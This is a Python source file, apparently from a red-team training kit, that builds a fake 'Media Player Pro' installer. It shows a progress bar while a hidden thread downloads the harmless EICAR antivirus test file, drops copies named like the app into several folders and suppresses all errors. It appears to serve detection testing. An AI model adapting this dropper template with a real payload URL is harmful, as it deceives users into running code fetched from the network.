"""
CYBERFORTRESS REDOPS - Fake Installer (Dropper)
================================================
MITRE ATT&CK: T1204.002 - User Execution: Malicious File
                T1105 - Ingress Tool Transfer

Creates a fake installer that:
1. Shows a progress bar "Installing..."
2. Downloads EICAR test file in background
3. Shows "Installation Complete!"

Build: python build.py malware-installer
"""

import os
import sys
import time
import ctypes
import threading
import urllib.request
import tempfile
from pathlib import Path

# Configuration
PAYLOAD_URL = "https://secure.eicar.org/eicar.com.txt"
FAKE_APP_NAME = "Media Player Pro"
PAYLOAD_FILENAME = f"{FAKE_APP_NAME}.exe"  # Downloaded file looks like the app

def is_admin():
    """Check if running as admin."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def get_script_dir():
    """Get directory where script/exe is located."""
    if getattr(sys, 'frozen', False):
        # Running as compiled exe
        return Path(sys.executable).parent
    else:
        # Running as script
        return Path(__file__).parent

def download_payload():
    """Download malicious payload in background."""
    try:
        output_dir = get_script_dir()
        output_path = output_dir / PAYLOAD_FILENAME
        
        # Download EICAR test file
        urllib.request.urlretrieve(PAYLOAD_URL, str(output_path))
        
        # Also try to download to temp and user folders for persistence
        try:
            temp_path = Path(tempfile.gettempdir()) / PAYLOAD_FILENAME
            urllib.request.urlretrieve(PAYLOAD_URL, str(temp_path))
        except:
            pass
        
        try:
            user_path = Path.home() / "Downloads" / PAYLOAD_FILENAME
            urllib.request.urlretrieve(PAYLOAD_URL, str(user_path))
        except:
            pass
            
    except Exception as e:
        pass  # Fail silently

def show_fake_installer():
    """Display fake installer progress."""
    print("")
    print("╔═══════════════════════════════════════════════════════════════════╗")
    print(f"║     {FAKE_APP_NAME} - Setup Wizard                              ║")
    print("╚═══════════════════════════════════════════════════════════════════╝")
    print("")
    print(f"Installing {FAKE_APP_NAME}...")
    print("")
    
    # Progress bar
    total_steps = 20
    for i in range(total_steps + 1):
        progress = int(i / total_steps * 100)
        bar = "█" * i + "░" * (total_steps - i)
        print(f"\r[{bar}] {progress}%", end="", flush=True)
        time.sleep(0.15)
    
    print("\n")
    print("╔═══════════════════════════════════════════════════════════════════╗")
    print("║     Installation Complete!                                        ║")
    print("╚═══════════════════════════════════════════════════════════════════╝")
    print("")
    print(f"{FAKE_APP_NAME} has been successfully installed.")
    print("You can now close this window.")
    print("")

def main():
    """Main entry point."""
    # Start payload download in background thread
    payload_thread = threading.Thread(target=download_payload, daemon=True)
    payload_thread.start()
    
    # Show fake installer UI
    show_fake_installer()
    
    # Wait for payload to finish
    payload_thread.join(timeout=5)
    
    # Keep window open
    if getattr(sys, 'frozen', False):
        input("Press Enter to exit...")

'''Compress-Archive -Path "dist\malware-installer\install.exe", "src\malware-execution\README.html" -DestinationPath "dist\MediaPlayerPro_Setup.zip" -Force'''

if __name__ == "__main__":
    main()
